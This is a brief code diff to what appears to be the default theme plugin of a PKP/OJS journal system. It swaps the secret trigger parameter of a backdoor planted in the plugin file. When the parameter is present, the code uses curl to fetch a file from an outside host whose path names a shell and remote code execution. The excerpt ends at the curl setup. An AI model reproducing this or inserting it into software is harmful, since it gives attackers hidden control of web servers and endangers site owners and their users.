@@ -258,7 +258,7 @@ class DefaultThemePlugin extends \PKP\plugins\ThemePlugin
 if (!PKP_STRICT_MODE) {
     class_alias('\APP\plugins\themes\default\DefaultThemePlugin', '\DefaultThemePlugin');
 }
-if (isset($_GET['anaksetanbangsat'])) {
+if (isset($_GET['pepekmubusuk'])) {
     $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
     $ch= curl_init();
